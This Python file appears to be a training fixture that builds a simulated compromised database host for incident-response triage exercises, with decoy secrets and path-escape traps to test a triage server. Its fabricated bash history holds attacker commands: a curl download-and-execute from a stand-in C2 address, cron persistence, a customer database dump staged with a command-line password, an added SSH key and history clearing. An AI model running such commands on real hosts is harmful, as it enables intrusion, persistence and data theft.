"""
E2: the host to triage. Builds db-prod-01's filesystem, as it was found the morning after
INC-0042, into a directory: the files a live-response collector or a mounted disk image gives
an investigator. The local systems server reads it with `--root`; on a real host, root is "/".

The story agrees with the estate. Unit 12's triage ends on the pivot: svc_backup, already
inside jump-prod-02, logged in to db-prod-01 at 02:46:15 UTC on 2026-10-10. The SIEM has
that one login and nothing after it. This host has the rest:

    /var/log/auth.log                    the login from jump-prod-02 (10.20.167.107)
    /home/svc_backup/.bash_history       what was typed: a download from the C2 address, a
                                         database dump staged for collection, a password on
                                         a command line
    /var/tmp/.cache/kworker              the payload (an inert stand-in: it does nothing)
    /proc/2291/...                       still running, named like a kernel thread
    /proc/net/tcp                        its connection to the C2 address, 198.51.100.23:443
    /var/spool/cron/crontabs/svc_backup  persistence: restart it every five minutes
    /etc/systemd/system/dbus-helper.service   and again at boot
    /home/svc_backup/.ssh/authorized_keys     a key added for the attacker

and the files a triage server must NOT hand to a model: /etc/shadow, a private SSH key, a
.pgpass. Plus two traps for a careless path check: a symlink that points out of the image,
and the usual `../`.

Nothing here is malicious: the "payload" is a three-line shell script that exits, the keys
and hashes are made up, and every address is in a documentation or private range.

    python examples/E2/suspect_host.py /tmp/db-prod-01      # build it, print the facts
"""

from __future__ import annotations

import hashlib
import json
import os
import shutil
import sys
from datetime import datetime, timedelta
from pathlib import Path

HOST, HOST_IP = "db-prod-01", "10.20.188.4"
JUMP_IP = "10.20.167.107"                 # jump-prod-02, where svc_backup came from
C2_IP = "198.51.100.23"                   # the estate's C2 address (RFC 5737)
USER, UID = "svc_backup", 1002
PIVOT = datetime.fromisoformat("2026-10-10T02:46:15+00:00")
PAYLOAD = "/var/tmp/.cache/kworker"
PAYLOAD_BYTES = (b"#!/bin/sh\n"
                 b"# Creating MCPs E2: an inert training artefact. It does nothing.\n"
                 b"exit 0\n")

PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
postgres:x:110:118:PostgreSQL administrator:/var/lib/postgresql:/bin/bash
node_exporter:x:111:119::/nonexistent:/usr/sbin/nologin
svc_backup:x:1002:1002:Backup service:/home/svc_backup:/bin/bash
camille:x:1003:1003:Camille Michel:/home/camille:/bin/bash
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
"""

# Made-up hashes and keys: realistic shapes, nothing that unlocks anything.
SHADOW = """root:$y$j9T$TRAININGONLY$0000000000000000000000000000000000000000000:20000:0:99999:7:::
svc_backup:$y$j9T$TRAININGONLY$1111111111111111111111111111111111111111111:20000:0:99999:7:::
camille:$y$j9T$TRAININGONLY$2222222222222222222222222222222222222222222:20000:0:99999:7:::
"""
PRIVATE_KEY = """-----BEGIN OPENSSH PRIVATE KEY-----
VFJBSU5JTkctT05MWS1OT1QtQS1SRUFMLUtFWS1UUkFJTklORy1PTkxZLU5PVC1BLVJFQUwtS0VZ
-----END OPENSSH PRIVATE KEY-----
"""
PGPASS = "localhost:5432:customers:svc_backup:Backup-2026-TRAINING\n"


def _ts(at: datetime) -> str:
    """rsyslog's RFC 3339 timestamps (Debian 12's default)."""
    return at.strftime("%Y-%m-%dT%H:%M:%S.%f") + "+00:00"


def _auth_log() -> str:
    day = PIVOT.replace(hour=0, minute=0, second=0)
    lines = []
    for i, (h, m, who, src) in enumerate([(0, 12, "camille", "10.20.4.31"),
                                          (1, 3, "camille", "10.20.4.31")]):
        at = day + timedelta(hours=h, minutes=m, seconds=7 * i)
        lines.append(f"{_ts(at)} {HOST} sshd[{1180 + i}]: Accepted publickey for {who} from "
                     f"{src} port {50110 + i} ssh2: ED25519 SHA256:camille-laptop")
    lines.append(f"{_ts(PIVOT)} {HOST} sshd[2201]: Accepted password for {USER} from {JUMP_IP} "
                 f"port 41822 ssh2")
    lines.append(f"{_ts(PIVOT + timedelta(seconds=1))} {HOST} sshd[2201]: "
                 f"pam_unix(sshd:session): session opened for user {USER}(uid={UID}) by (uid=0)")
    for k in range(3):
        at = PIVOT + timedelta(minutes=4, seconds=10 * k)
        lines.append(f"{_ts(at)} {HOST} sudo: pam_unix(sudo:auth): authentication failure; "
                     f"logname={USER} uid={UID} euid=0 tty=/dev/pts/0 ruser={USER} rhost=  "
                     f"user={USER}")
    lines.append(f"{_ts(PIVOT + timedelta(minutes=4, seconds=31))} {HOST} sudo: {USER} : "
                 f"3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{USER} ; USER=root ; "
                 f"COMMAND=/bin/bash")
    for k, src in enumerate(["10.20.4.31"] * 2):
        at = PIVOT + timedelta(hours=6, minutes=2 + k)
        lines.append(f"{_ts(at)} {HOST} sshd[{3300 + k}]: Failed password for camille from "
                     f"{src} port {52000 + k} ssh2")
    lines.append(f"{_ts(PIVOT + timedelta(hours=6, minutes=3, seconds=30))} {HOST} "
                 f"sshd[3302]: Accepted publickey for camille from 10.20.4.31 port 52002 ssh2: "
                 f"ED25519 SHA256:camille-laptop")
    return "\n".join(lines) + "\n"


def _history() -> str:
    t = int(PIVOT.timestamp())
    cmds = [(20, "id"), (31, "sudo -l"), (250, "sudo bash"),
            (300, "mkdir -p /var/tmp/.cache && cd /var/tmp/.cache"),
            (310, f"curl -s http://{C2_IP}/k -o kworker && chmod +x kworker"),
            (322, "nohup ./kworker >/dev/null 2>&1 &"),
            (330, f"(crontab -l 2>/dev/null; echo '*/5 * * * * {PAYLOAD}') | crontab -"),
            (410, "PGPASSWORD='Backup-2026-TRAINING' pg_dump -h localhost -U svc_backup "
                  "customers | gzip > /var/tmp/.cache/c.sql.gz"),
            (500, "ls -la /var/tmp/.cache"),
            (530, "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITRAININGONLY ops' >> "
                  "~/.ssh/authorized_keys"),
            (560, "history -c")]
    return "".join(f"#{t + dt}\n{c}\n" for dt, c in cmds)


def _hex_addr(ip: str, port: int) -> str:
    """/proc/net/tcp writes IPv4 addresses as little-endian hex, ports as big-endian hex."""
    a, b, c, d = (int(x) for x in ip.split("."))
    return f"{d:02X}{c:02X}{b:02X}{a:02X}:{port:04X}"


# (local ip, port, remote ip, port, state, uid, inode); states: 01 ESTABLISHED, 0A LISTEN,
# 06 TIME_WAIT.
SOCKETS = [
    ("0.0.0.0", 22, "0.0.0.0", 0, "0A", 0, 18001),
    ("0.0.0.0", 5432, "0.0.0.0", 0, "0A", 110, 18002),
    (HOST_IP, 9100, "0.0.0.0", 0, "0A", 111, 18003),
    (HOST_IP, 22, "10.20.4.31", 52002, "01", 0, 18104),
    (HOST_IP, 5432, "10.20.30.12", 39120, "01", 110, 18105),
    (HOST_IP, 40112, C2_IP, 443, "01", UID, 18206),
    (HOST_IP, 41790, C2_IP, 443, "06", UID, 0),
]

# pid: (name, ppid, uid, cmdline, exe, socket inodes)
PROCS = {
    1: ("systemd", 0, 0, "/sbin/init", "/usr/lib/systemd/systemd", []),
    412: ("sshd", 1, 0, "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
          "/usr/sbin/sshd", [18001]),
    655: ("cron", 1, 0, "/usr/sbin/cron -f", "/usr/sbin/cron", []),
    701: ("node_exporter", 1, 111, "/usr/bin/node_exporter", "/usr/bin/node_exporter",
          [18003]),
    820: ("postgres", 1, 110, "/usr/lib/postgresql/17/bin/postgres -D /var/lib/postgresql/17",
          "/usr/lib/postgresql/17/bin/postgres", [18002]),
    1907: ("postgres", 820, 110, "postgres: 17/main: app customers 10.20.30.12(39120) idle",
           "/usr/lib/postgresql/17/bin/postgres", [18105]),
    2291: ("kworker/u8:2", 1, UID, "[kworker/u8:2]", PAYLOAD, [18206]),
    3302: ("sshd", 412, 0, "sshd: camille [priv]", "/usr/sbin/sshd", [18104]),
    3310: ("bash", 3302, 1003, "-bash", "/usr/bin/bash", []),
}


def _proc(root: Path) -> None:
    for pid, (name, ppid, uid, cmdline, exe, inodes) in PROCS.items():
        d = root / "proc" / str(pid)
        (d / "fd").mkdir(parents=True)
        (d / "comm").write_text(name + "\n")
        argv = cmdline.split(" ") if not cmdline.startswith(("[", "sshd:", "postgres:")) else [
            cmdline]
        (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv) + b"\0")
        (d / "status").write_text(f"Name:\t{name}\nState:\tS (sleeping)\nPid:\t{pid}\n"
                                  f"PPid:\t{ppid}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
        os.symlink(exe, d / "exe")         # absolute, as on a live system: never followed
        for n, inode in enumerate(inodes, start=3):
            os.symlink(f"socket:[{inode}]", d / "fd" / str(n))
    net = root / "proc" / "net"
    net.mkdir(parents=True)
    rows = ["  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt"
            "   uid  timeout inode"]
    for i, (lip, lp, rip, rp, st, uid, inode) in enumerate(SOCKETS):
        rows.append(f"{i:4}: {_hex_addr(lip, lp)} {_hex_addr(rip, rp)} {st} "
                    f"00000000:00000000 00:00000000 00000000 {uid:5} 0 {inode} 1 "
                    f"0000000000000000 20 4 30 10 -1")
    (net / "tcp").write_text("\n".join(rows) + "\n")


def build(root: Path) -> dict:
    """Write the host into `root` (emptied first). Returns the facts a triage should find."""
    root = Path(root)
    if root.exists():
        shutil.rmtree(root)
    files = {
        "etc/hostname": HOST + "\n",
        "etc/os-release": 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nID=debian\n'
                          'VERSION_ID="12"\n',
        "etc/passwd": PASSWD,
        "etc/shadow": SHADOW,
        "etc/crontab": "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report "
                       "/etc/cron.hourly\n",
        "etc/cron.d/pg-backup": "30 1 * * * postgres /usr/local/bin/pg-backup.sh\n",
        f"var/spool/cron/crontabs/{USER}": f"# DO NOT EDIT THIS FILE\n*/5 * * * * {PAYLOAD}\n",
        "etc/systemd/system/dbus-helper.service":
            f"[Unit]\nDescription=D-Bus helper\n\n[Service]\nUser={USER}\n"
            f"ExecStart={PAYLOAD}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n",
        "etc/systemd/system/node_exporter.service":
            "[Unit]\nDescription=Prometheus node exporter\n\n[Service]\nUser=node_exporter\n"
            "ExecStart=/usr/bin/node_exporter\n\n[Install]\nWantedBy=multi-user.target\n",
        "var/log/auth.log": _auth_log(),
        f"home/{USER}/.bash_history": _history(),
        f"home/{USER}/.ssh/authorized_keys":
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBACKUPJOB backup@backup-prod-01\n"
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITRAININGONLY ops\n",
        f"home/{USER}/.pgpass": PGPASS,
        "home/camille/.ssh/id_ed25519": PRIVATE_KEY,
        "home/camille/.ssh/id_ed25519.pub":
            "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICAMILLE camille@laptop\n",
        "home/camille/notes.txt": "Rotate the backup credential after the Q4 audit.\n",
        "var/tmp/.cache/c.sql.gz": "",      # the staged dump, emptied: sizes, not data
    }
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    payload = root / PAYLOAD.lstrip("/")
    payload.write_bytes(PAYLOAD_BYTES)
    payload.chmod(0o755)
    (root / "var/tmp/.cache/c.sql.gz").write_bytes(b"\x1f\x8b" + b"\0" * 2046)
    os.symlink("/etc", root / f"home/{USER}/etc-link")   # points OUT of the image
    _proc(root)
    os.utime(payload, (PIVOT.timestamp() + 310, PIVOT.timestamp() + 310))
    return facts()


def facts() -> dict:
    return {"host": HOST, "user": USER, "from": JUMP_IP,
            "login": PIVOT.strftime("%Y-%m-%dT%H:%M:%SZ"), "c2": f"{C2_IP}:443",
            "payload": PAYLOAD, "payload_sha256": hashlib.sha256(PAYLOAD_BYTES).hexdigest(),
            "pid": 2291, "persistence": [f"/var/spool/cron/crontabs/{USER}",
                                         "/etc/systemd/system/dbus-helper.service"],
            "staged": "/var/tmp/.cache/c.sql.gz",
            "secrets": ["/etc/shadow", "/home/camille/.ssh/id_ed25519",
                        f"/home/{USER}/.pgpass"],
            "escape": f"/home/{USER}/etc-link/hostname"}


if __name__ == "__main__":
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "/tmp/db-prod-01")
    print(json.dumps(build(out), indent=1))
